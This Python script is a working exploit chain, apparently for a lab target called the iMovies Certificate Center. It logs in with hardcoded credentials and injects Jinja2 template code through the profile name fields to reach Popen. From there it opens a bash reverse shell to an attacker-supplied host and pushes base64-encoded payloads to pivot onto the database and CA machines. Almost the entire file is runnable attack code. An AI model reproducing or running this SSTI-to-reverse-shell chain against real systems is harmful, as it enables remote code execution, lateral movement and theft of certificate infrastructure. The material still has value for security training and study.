#!/usr/bin/env python3

import html
import re
import sys
from base64 import b64encode

import requests
from bs4 import BeautifulSoup
from pwn import *
from urllib3.exceptions import InsecureRequestWarning

WEB_HOST = 'https://imovies.ch:8000'

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)


def web_login(session, uid, pwd, next='/'):
    url = f'{WEB_HOST}/login'
    params = {'next': next}
    response = session.get(url, params=params)
    response.raise_for_status()
    soup = BeautifulSoup(response.text, 'html.parser')
    csrf_token = soup.find('input', {'name': 'csrf_token'})['value']

    url = f'{WEB_HOST}/login'
    data = {'uid': uid, 'pwd': pwd, 'next': next, 'csrf_token': csrf_token}
    response = session.post(url, data=data)
    response.raise_for_status()

    return response.text


def web_index(session):
    url = f'{WEB_HOST}/'
    response = session.get(url)
    response.raise_for_status()

    return response.text


def web_issue(session, uid, email=None, firstname=None, lastname=None, passphrase=''):
    url = f'{WEB_HOST}/profile/{uid}'
    response = session.get(url)
    response.raise_for_status()
    soup = BeautifulSoup(response.text, 'html.parser')

    email = email or soup.find('input', {'name': 'email'})['value']
    firstname = firstname or soup.find('input', {'name': 'firstname'})['value']
    lastname = lastname or soup.find('input', {'name': 'lastname'})['value']
    csrf_token = soup.find('input', {'name': 'csrf_token'})['value']

    url = f'{WEB_HOST}/profile/{uid}/issue'
    data = {'email': email, 'firstname': firstname, 'lastname': lastname, 'passphrase': passphrase, 'csrf_token': csrf_token}
    response = session.post(url, data=data)
    response.raise_for_status()

    return response.text


def web_render(session, uid, part_1, part_2):
    assert part_1 and len(part_1) <= 64
    assert part_2 and len(part_2) <= 64

    web_issue(session, uid, firstname=part_1, lastname=part_2)
    text = web_index(session)
    answer = html.unescape(html.unescape(re.search(r'Hello, (?P<name>.*)\. This is the iMovies Certificate Center\.', text, re.DOTALL).group('name'))).strip()

    return answer


def web_find_subclass(name):
    uid = 'ps'
    pwd = 'KramBamBuli'

    session = requests.session()
    session.verify = False

    web_login(session, uid, pwd, f'/profile/{uid}')

    part_1 = "{% for x in ''.__class__.mro()[1].__subclasses__() -%}"
    part_2 = "{{ x.__name__ }}\n{% endfor %}"

    answer = web_render(session, uid, part_1, part_2)
    subclasses = [a.strip() for a in answer.split('\n')]

    return subclasses.index(name) if name in subclasses else None


def web_reverse_shell(remote_attacker_ip, remote_attacker_port):
    uid = 'ps'
    pwd = 'KramBamBuli'

    session = requests.session()
    session.verify = False

    web_login(session, uid, pwd, f'/profile/{uid}')

    popen_index = web_find_subclass('Popen')
    assert popen_index

    log.debug(f"Found Popen: ''.__class__.mro()[1].__subclasses__()[{popen_index}]")

    part_1 = f"{{{{''.__class__.mro()[1].__subclasses__()[{popen_index}](['/bin/bash','-c',"
    part_2 = f"'/bin/bash -i >& /dev/tcp/{remote_attacker_ip}/{remote_attacker_port} 0>&1'])}}}}"

    answer = web_render(session, uid, part_1, part_2)

    log.debug(answer)


def web_run_py_file(io, filepath, args=(), exit=True):
    def quote(s):
        return f"'{s}'"

    with open(filepath, 'rb') as f:
        command = f'python3 -c "$(echo \'{b64encode(f.read()).decode()}\' | base64 --decode)" {" ".join(quote(arg) for arg in args)}{"; exit" if exit else ""}'.encode()

    return io.sendline(command)


def web_backdoor(local_attacker_port, remote_attacker_ip, remote_attacker_port):
    web_listener = listen(local_attacker_port)
    web_reverse_shell(remote_attacker_ip, remote_attacker_port)
    web_io = web_listener.wait_for_connection()
    web_io.interactive(prompt='')


def db_backdoor(local_attacker_port, remote_attacker_ip, remote_attacker_port):
    web_listener = listen(local_attacker_port)
    web_reverse_shell(remote_attacker_ip, remote_attacker_port)
    web_io = web_listener.wait_for_connection()
    web_run_py_file(web_io, './payloads/db_shell.py')
    web_io.interactive(prompt='')


def ca_backdoor(local_attacker_port, remote_attacker_ip, remote_attacker_port):
    web_listener = listen(local_attacker_port)
    web_reverse_shell(remote_attacker_ip, remote_attacker_port)
    web_io = web_listener.wait_for_connection()
    web_run_py_file(web_io, './payloads/ca_forward.py', args=(remote_attacker_ip, remote_attacker_port))
    web_listener.close()

    ca_listener = listen(local_attacker_port)
    ca_io = ca_listener.wait_for_connection()
    ca_io.interactive(prompt='')


def main():
    if len(sys.argv) < 5:
        print(f'Usage: {sys.argv[0]} LOCAL_ATTACKER_PORT REMOTE_ATTACKER_IP REMOTE_ATTACKER_PORT <web|db|ca>', file=sys.stderr)
        sys.exit(2)

    local_attacker_port = int(sys.argv[1])
    remote_attacker_ip = sys.argv[2]
    remote_attacker_port = int(sys.argv[3])
    vulnerable_host = sys.argv[4]

    if vulnerable_host == 'web':
        web_backdoor(local_attacker_port, remote_attacker_ip, remote_attacker_port)
    elif vulnerable_host == 'db':
        db_backdoor(local_attacker_port, remote_attacker_ip, remote_attacker_port)
    elif vulnerable_host == 'ca':
        ca_backdoor(local_attacker_port, remote_attacker_ip, remote_attacker_port)
    else:
        print(f"Unknown vulnerable host '{vulnerable_host}'")
        sys.exit(2)


if __name__ == '__main__':
    main()
